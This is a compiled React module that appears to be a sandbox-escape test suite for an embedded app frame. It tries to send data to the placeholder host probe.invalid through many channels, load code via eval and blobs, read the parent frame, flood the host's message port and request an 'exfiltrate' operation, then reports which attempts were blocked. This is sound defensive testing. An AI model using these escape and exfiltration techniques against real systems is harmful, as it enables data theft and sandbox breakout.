import { jsx, jsxs } from "react/jsx-runtime";
import { useState, useEffect } from "react";
const violations = [];
let listening = false;
const collectViolations = () => {
  if (listening) return;
  listening = true;
  document.addEventListener("securitypolicyviolation", (event) => {
    violations.push({
      directive: event.violatedDirective,
      blockedURI: event.blockedURI
    });
  });
};
const settle = (ms = 250) => new Promise((resolve) => setTimeout(resolve, ms));
const blockedBy = (directive) => violations.find((violation) => violation.directive.startsWith(directive));
const allViolations = () => violations;
const TARGET = "https://probe.invalid/spiral";
const blocked$2 = (name, detail) => ({
  name,
  verdict: "blocked",
  detail
});
const reached$2 = (name, detail) => ({
  name,
  verdict: "REACHED",
  detail
});
const inconclusive = (name, detail) => ({
  name,
  verdict: "inconclusive",
  detail
});
const checkFetch = async () => {
  try {
    await fetch(TARGET, { mode: "no-cors" });
    return reached$2("fetch", "fetch() resolved");
  } catch (error) {
    await settle();
    const violation = blockedBy("connect-src");
    return violation ? blocked$2("fetch", `refused by ${violation.directive} before any request`) : inconclusive(
      "fetch",
      `rejected (${String(error).slice(0, 60)}) but no connect-src violation — could be DNS; confirm with a capture`
    );
  }
};
const checkXhr = async () => {
  const outcome = await new Promise((resolve) => {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", TARGET, true);
      xhr.onload = () => resolve("loaded");
      xhr.onerror = () => resolve("errored");
      xhr.send();
    } catch {
      resolve("errored");
    }
    setTimeout(() => resolve("silent"), 2e3);
  });
  if (outcome === "loaded") return reached$2("xhr", "onload fired");
  await settle();
  const violation = blockedBy("connect-src");
  if (violation) return blocked$2("xhr", `refused by ${violation.directive} before any request`);
  return inconclusive("xhr", `${outcome}, no connect-src violation; confirm with a capture`);
};
const checkWebSocket = async () => {
  try {
    const ctor = globalThis.WebSocket;
    if (!ctor) return blocked$2("websocket", "constructor removed by harden()");
    const socket = new ctor("wss://probe.invalid/spiral");
    socket.close();
    return reached$2("websocket", "constructor accepted a URL");
  } catch (error) {
    return blocked$2("websocket", String(error).slice(0, 120));
  }
};
const checkEventSource = async () => {
  try {
    const ctor = globalThis.EventSource;
    if (!ctor) return blocked$2("eventsource", "constructor removed by harden()");
    const source = new ctor(TARGET);
    source.close();
    return reached$2("eventsource", "constructor accepted a URL");
  } catch (error) {
    return blocked$2("eventsource", String(error).slice(0, 120));
  }
};
const checkBeacon = async () => {
  try {
    const sent = navigator.sendBeacon?.(TARGET, "x");
    return sent ? reached$2("sendBeacon", "returned true") : blocked$2("sendBeacon", "returned false");
  } catch (error) {
    return blocked$2("sendBeacon", String(error).slice(0, 120));
  }
};
const checkImage = async () => {
  const loaded = await new Promise((resolve) => {
    const image = new Image();
    image.onload = () => resolve(true);
    image.onerror = () => resolve(false);
    image.src = `${TARGET}.png`;
    setTimeout(() => resolve(false), 2e3);
  });
  if (loaded) return reached$2("img", "image loaded");
  await settle();
  const violation = blockedBy("img-src");
  return violation ? blocked$2("img", `refused by ${violation.directive}`) : inconclusive("img", "error with no img-src violation; confirm with a capture");
};
const checkStylesheet = async () => {
  const loaded = await new Promise((resolve) => {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.onload = () => resolve(true);
    link.onerror = () => resolve(false);
    link.href = `${TARGET}.css`;
    document.head.appendChild(link);
    setTimeout(() => resolve(false), 2e3);
  });
  if (loaded) return reached$2("css", "stylesheet loaded");
  await settle();
  const violation = blockedBy("style-src");
  return violation ? blocked$2("css", `refused by ${violation.directive}`) : inconclusive("css", "error with no style-src violation; confirm with a capture");
};
const checkEvalBypass = async () => {
  const attempts = [];
  try {
    const build = new Function("u", "return import(u)");
    await build(`${TARGET}.js`);
    return reached$2("eval-bypass", "new Function built a working dynamic import");
  } catch (error) {
    attempts.push(`Function: ${String(error).slice(0, 60)}`);
  }
  try {
    const indirect = eval;
    await indirect(`import("${TARGET}.js")`);
    return reached$2("eval-bypass", "indirect eval performed a dynamic import");
  } catch (error) {
    attempts.push(`eval: ${String(error).slice(0, 60)}`);
  }
  return blocked$2("eval-bypass", attempts.join(" | "));
};
const checkBlobViaEval = async () => {
  try {
    const blob = new Blob([`export default 1;`], { type: "text/javascript" });
    const url = URL.createObjectURL(blob);
    try {
      const build = new Function("u", "return import(u)");
      await build(url);
      return reached$2("blob-via-eval", "Function+blob import executed attacker code");
    } finally {
      URL.revokeObjectURL(url);
    }
  } catch (error) {
    return blocked$2("blob-via-eval", String(error).slice(0, 120));
  }
};
const checkWorker = async () => {
  try {
    const blob = new Blob(["self.close()"], { type: "text/javascript" });
    const worker = new Worker(URL.createObjectURL(blob));
    await settle();
    worker.terminate();
    const violation = blockedBy("worker-src");
    return violation ? blocked$2("worker", `refused by ${violation.directive}`) : reached$2("worker", "Worker constructed and no worker-src violation was reported");
  } catch (error) {
    return blocked$2("worker", String(error).slice(0, 120));
  }
};
const checkServiceWorker = async () => {
  try {
    if (!("serviceWorker" in navigator)) {
      return blocked$2("serviceworker", "navigator.serviceWorker absent (opaque origin)");
    }
    await navigator.serviceWorker.register("./sw.js");
    return reached$2("serviceworker", "registration resolved");
  } catch (error) {
    return blocked$2("serviceworker", String(error).slice(0, 120));
  }
};
const checkWebRtc = async () => {
  const names = [
    "RTCPeerConnection",
    "webkitRTCPeerConnection",
    "mozRTCPeerConnection"
  ];
  for (const name of names) {
    const ctor = globalThis[name];
    if (typeof ctor !== "function") continue;
    try {
      const connection = new ctor({
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
      });
      connection.close();
      return reached$2("webrtc", `${name} constructed with a STUN server`);
    } catch (error) {
      return blocked$2("webrtc", `${name}: ${String(error).slice(0, 100)}`);
    }
  }
  return blocked$2("webrtc", "no RTCPeerConnection constructor in this realm");
};
const checkFormSubmit = async () => {
  try {
    const form = document.createElement("form");
    form.method = "POST";
    form.action = TARGET;
    document.body.appendChild(form);
    const before = location.href;
    form.submit();
    await settle();
    form.remove();
    const violation = blockedBy("form-action");
    if (violation) return blocked$2("form-submit", `refused by ${violation.directive}`);
    const stillHere = location.href === before;
    const opaque = origin === "null";
    if (stillHere && opaque) {
      return blocked$2("form-submit", "sandboxed frame without allow-forms; no navigation occurred");
    }
    return inconclusive(
      "form-submit",
      `no violation, origin=${origin}, navigated=${!stillHere}; confirm with a packet capture`
    );
  } catch (error) {
    return blocked$2("form-submit", String(error).slice(0, 120));
  }
};
const runNetworkChecks = async () => [
  await checkFetch(),
  await checkXhr(),
  await checkWebSocket(),
  await checkEventSource(),
  await checkBeacon(),
  await checkImage(),
  await checkStylesheet(),
  await checkEvalBypass(),
  await checkBlobViaEval(),
  await checkWorker(),
  await checkServiceWorker(),
  await checkWebRtc(),
  await checkFormSubmit()
];
const blocked$1 = (name, detail) => ({
  name,
  verdict: "blocked",
  detail
});
const reached$1 = (name, detail) => ({
  name,
  verdict: "REACHED",
  detail
});
const checkParentAccess = () => {
  try {
    const href = window.parent.location.href;
    return reached$1("parent-location", `read parent href: ${href.slice(0, 60)}`);
  } catch (error) {
    return blocked$1("parent-location", String(error).slice(0, 120));
  }
};
const checkParentDocument = () => {
  try {
    const body = window.parent.document.body;
    return body ? reached$1("parent-document", "read parent document.body") : blocked$1("parent-document", "parent document.body was null");
  } catch (error) {
    return blocked$1("parent-document", String(error).slice(0, 120));
  }
};
const checkNativeBridge = () => {
  let webkit;
  try {
    webkit = globalThis.webkit;
  } catch (error) {
    return blocked$1("webkit-handlers", `access threw: ${String(error).slice(0, 80)}`);
  }
  if (!webkit?.messageHandlers) {
    return blocked$1("webkit-handlers", "window.webkit.messageHandlers absent");
  }
  const names = Object.keys(webkit.messageHandlers);
  const descriptor = Object.getOwnPropertyDescriptor(globalThis, "webkit");
  const shape = descriptor ? `configurable=${descriptor.configurable} writable=${descriptor.writable} accessor=${descriptor.get !== void 0}` : "no own descriptor (inherited)";
  return reached$1("webkit-handlers", `visible: [${names.join(",") || "opaque"}] — ${shape}`);
};
const checkJavascriptInterface = () => {
  const suspects = ["elementX", "backHandler", "spiralApp", "Android"];
  const found = suspects.filter(
    (name) => typeof globalThis[name] === "object"
  );
  return found.length > 0 ? reached$1("javascript-interface", `visible: ${found.join(",")}`) : blocked$1("javascript-interface", "no injected interface objects");
};
const checkShellGlobal = () => globalThis.__spiralShell ? reached$1("shell-global", "__spiralShell visible from the app realm") : blocked$1("shell-global", "__spiralShell not in this realm");
const checkTopNavigation = () => {
  try {
    window.top?.location.replace("https://probe.invalid/");
    return reached$1("top-navigation", "location.replace did not throw");
  } catch (error) {
    return blocked$1("top-navigation", String(error).slice(0, 120));
  }
};
const checkWindowOpen = () => {
  try {
    const opened = window.open("https://probe.invalid/", "_blank");
    if (opened) {
      opened.close();
      return reached$1("window-open", "window.open returned a handle");
    }
    return blocked$1("window-open", "window.open returned null (no allow-popups)");
  } catch (error) {
    return blocked$1("window-open", String(error).slice(0, 120));
  }
};
const checkNestedFrame = () => {
  try {
    const frame = document.createElement("iframe");
    frame.src = "about:blank";
    document.body.appendChild(frame);
    const hasRtc = typeof frame.contentWindow?.["RTCPeerConnection"] === "function";
    frame.remove();
    return hasRtc ? reached$1("nested-frame", "child frame has a pristine RTCPeerConnection") : blocked$1("nested-frame", "child frame created but carries no RTC constructor");
  } catch (error) {
    return blocked$1("nested-frame", String(error).slice(0, 120));
  }
};
const checkStorage = async () => {
  const reachable = [];
  try {
    localStorage.setItem("spiral-probe", "1");
    localStorage.removeItem("spiral-probe");
    reachable.push("localStorage");
  } catch {
  }
  try {
    document.cookie = "spiral-probe=1";
    if (document.cookie.includes("spiral-probe")) reachable.push("cookie");
  } catch {
  }
  try {
    const request = indexedDB.open("spiral-probe");
    const opened = await new Promise((resolve) => {
      request.onsuccess = () => resolve(true);
      request.onerror = () => resolve(false);
      request.onblocked = () => resolve(false);
      setTimeout(() => resolve(false), 500);
    });
    if (opened) reachable.push("indexedDB");
  } catch {
  }
  return reachable.length > 0 ? reached$1("storage", `usable: ${reachable.join(",")}`) : blocked$1("storage", "localStorage, cookies and indexedDB all unusable");
};
const runEscapeChecks = async () => [
  checkParentAccess(),
  checkParentDocument(),
  checkNativeBridge(),
  checkJavascriptInterface(),
  checkShellGlobal(),
  checkTopNavigation(),
  checkWindowOpen(),
  checkNestedFrame(),
  await checkStorage()
];
const result = (name, detail) => ({
  name,
  verdict: "blocked",
  detail
});
const checkCpuBurn = async () => {
  const budgetMs = 750;
  const started = performance.now();
  let iterations = 0;
  while (performance.now() - started < budgetMs) {
    iterations += 1;
  }
  const elapsed = Math.round(performance.now() - started);
  return result("cpu-burn", `${iterations} iterations in ${elapsed}ms on the main thread`);
};
const checkMemory = async () => {
  const chunks = [];
  const chunkBytes = 1024 * 1024;
  const maxChunks = 24;
  let allocated = 0;
  try {
    for (let index = 0; index < maxChunks; index += 1) {
      const chunk = new Uint8Array(chunkBytes);
      chunk[0] = index;
      chunks.push(chunk);
      allocated += chunkBytes;
    }
  } catch (error) {
    return result("memory", `allocation failed at ${allocated} bytes: ${String(error).slice(0, 80)}`);
  } finally {
    chunks.length = 0;
  }
  return result("memory", `allocated and released ${allocated / (1024 * 1024)} MiB`);
};
const checkOversizedMessage = async () => {
  const port = globalThis.__spiralPort;
  if (!port) return result("oversized-message", "no port in this realm (probe ran standalone)");
  const payload = "x".repeat(128 * 1024);
  return new Promise((resolve) => {
    const onMessage = (event) => {
      const data = event.data;
      if (data?.id !== "probe-oversized") return;
      port.removeEventListener("message", onMessage);
      resolve(
        result(
          "oversized-message",
          data.ok === false ? `refused with code=${data.code}` : "SHELL ACCEPTED AN OVERSIZED MESSAGE"
        )
      );
    };
    port.addEventListener("message", onMessage);
    port.postMessage({
      id: "probe-oversized",
      method: "state.shared.write",
      args: { op: { set: { path: "oversized", value: payload } } },
      userActivation: false
    });
    setTimeout(() => {
      port.removeEventListener("message", onMessage);
      resolve(result("oversized-message", "no reply within 3s"));
    }, 3e3);
  });
};
const checkFlood = async () => {
  const port = globalThis.__spiralPort;
  if (!port) return result("request-flood", "no port in this realm (probe ran standalone)");
  const total = 128;
  let refused = 0;
  let answered = 0;
  return new Promise((resolve) => {
    const onMessage = (event) => {
      const data = event.data;
      if (!data?.id?.startsWith("probe-flood-")) return;
      answered += 1;
      if (data.ok === false) refused += 1;
      if (answered === total) {
        port.removeEventListener("message", onMessage);
        resolve(result("request-flood", `${refused}/${total} refused by the shell quota`));
      }
    };
    port.addEventListener("message", onMessage);
    for (let index = 0; index < total; index += 1) {
      port.postMessage({
        id: `probe-flood-${index}`,
        method: "app.context.read",
        args: null,
        userActivation: false
      });
    }
    setTimeout(() => {
      port.removeEventListener("message", onMessage);
      resolve(result("request-flood", `${answered}/${total} answered, ${refused} refused within 4s`));
    }, 4e3);
  });
};
const checkUnknownOperation = async () => {
  const port = globalThis.__spiralPort;
  if (!port) return result("unknown-operation", "no port in this realm (probe ran standalone)");
  return new Promise((resolve) => {
    const onMessage = (event) => {
      const data = event.data;
      if (data?.id !== "probe-bad-op") return;
      port.removeEventListener("message", onMessage);
      resolve(
        result(
          "unknown-operation",
          data.ok === false ? `refused by the shell: ${data.message}` : "SHELL FORWARDED AN OPERATION IT CANNOT CARRY OUT"
        )
      );
    };
    port.addEventListener("message", onMessage);
    port.postMessage({
      id: "probe-bad-op",
      method: "state.shared.write",
      args: { op: { exfiltrate: { path: "anything", to: "https://probe.invalid" } } },
      userActivation: false
    });
    setTimeout(() => {
      port.removeEventListener("message", onMessage);
      resolve(result("unknown-operation", "no reply within 3s"));
    }, 3e3);
  });
};
const runResourceChecks = async () => [
  await checkCpuBurn(),
  await checkMemory(),
  await checkOversizedMessage(),
  await checkUnknownOperation(),
  await checkFlood()
];
const blocked = (name, detail) => ({
  name,
  verdict: "blocked",
  detail
});
const reached = (name, detail) => ({
  name,
  verdict: "REACHED",
  detail
});
const checkPreviousMarker = () => {
  const marker = globalThis["__spiralProbeWasHere"];
  return typeof marker === "string" ? reached("previous-app-marker", `found a marker from ${marker}`) : blocked("previous-app-marker", "no marker from a previous app in this realm");
};
const checkPreviousReport = () => globalThis.__spiralProbe ? reached("previous-report", "__spiralProbe from an earlier run is still present") : blocked("previous-report", "no earlier __spiralProbe in this realm");
const checkStrayTimers = () => {
  const handle = setTimeout(() => void 0, 0);
  clearTimeout(handle);
  const numeric = typeof handle === "number" ? handle : Number(handle);
  return numeric > 500 ? reached("timer-id-baseline", `first timer id was ${numeric}, realm is not fresh`) : blocked("timer-id-baseline", `first timer id was ${numeric}`);
};
const DOM_MARKER_ID = "spiral-probe-dom-marker";
const checkDomResidue = () => {
  const found = document.getElementById(DOM_MARKER_ID) !== null;
  if (!found) {
    const marker = document.createElement("div");
    marker.id = DOM_MARKER_ID;
    marker.hidden = true;
    document.body.appendChild(marker);
  }
  return found ? reached("dom-residue", "a marker node from an earlier app is still in this document") : blocked("dom-residue", "no marker from an earlier app");
};
const checkModuleResidue = () => {
  const suspects = ["__spiralInit", "__spiralPort"];
  const present = suspects.filter((name) => name in globalThis);
  return blocked("module-residue", `handshake globals present: ${present.join(",") || "none"}`);
};
const runLeakChecks = () => [
  checkPreviousMarker(),
  checkPreviousReport(),
  checkStrayTimers(),
  checkDomResidue(),
  checkModuleResidue()
];
const allBlocked = (results) => results.every((result2) => result2.verdict === "blocked");
const runAll = async () => {
  const startedAt = (/* @__PURE__ */ new Date()).toISOString();
  collectViolations();
  const network = await runNetworkChecks();
  const escape = await runEscapeChecks();
  const resource = await runResourceChecks();
  const leak = runLeakChecks();
  const report = {
    startedAt,
    finishedAt: (/* @__PURE__ */ new Date()).toISOString(),
    userAgent: navigator.userAgent,
    network,
    escape,
    resource,
    leak,
    pass: allBlocked(network) && allBlocked(escape) && allBlocked(leak)
  };
  globalThis.__spiralProbe = report;
  console.log("[spiral-probe]", JSON.stringify(report, null, 2));
  console.info("[spiral-probe] CSP refusals:", JSON.stringify(allViolations()));
  const port = globalThis.__spiralPort;
  port?.postMessage({
    id: `probe-report-${startedAt}`,
    method: "spike.report",
    args: report,
    userActivation: false
  });
  try {
    globalThis["__spiralProbeWasHere"] = startedAt;
  } catch {
  }
  return report;
};
const Group = ({
  title,
  results
}) => /* @__PURE__ */ jsxs("section", { style: { margin: "0 0 10px" }, children: [
  /* @__PURE__ */ jsx(
    "h2",
    {
      style: {
        font: "600 12px/1.3 -apple-system,system-ui,sans-serif",
        margin: "0 0 4px",
        color: "#49454f"
      },
      children: title
    }
  ),
  results.map((result2) => /* @__PURE__ */ jsxs(
    "div",
    {
      style: {
        font: "12px/1.5 ui-monospace,SFMono-Regular,monospace",
        color: result2.verdict === "blocked" ? "#1d1b20" : "#b3261e"
      },
      children: [
        result2.verdict === "blocked" ? "·" : "!",
        " ",
        result2.name,
        " — ",
        result2.verdict,
        " —",
        " ",
        result2.detail
      ]
    },
    result2.name
  ))
] });
function Probe() {
  const [report, setReport] = useState(null);
  useEffect(() => {
    void runAll().then(setReport);
  }, []);
  if (!report) {
    return /* @__PURE__ */ jsx("div", { style: { font: "14px/1.4 -apple-system,system-ui,sans-serif", padding: 12 }, children: "Running probe…" });
  }
  return /* @__PURE__ */ jsxs("div", { style: { padding: 12 }, children: [
    /* @__PURE__ */ jsx(
      "h1",
      {
        style: {
          font: "600 15px/1.3 -apple-system,system-ui,sans-serif",
          margin: "0 0 8px",
          color: report.pass ? "#0f7b3f" : "#b3261e"
        },
        children: report.pass ? "PROBE: all blocked" : "PROBE: SOMETHING GOT THROUGH"
      }
    ),
    /* @__PURE__ */ jsx(Group, { title: "network", results: report.network }),
    /* @__PURE__ */ jsx(Group, { title: "escape", results: report.escape }),
    /* @__PURE__ */ jsx(Group, { title: "resource", results: report.resource }),
    /* @__PURE__ */ jsx(Group, { title: "leak", results: report.leak })
  ] });
}
export {
  Probe as default
};
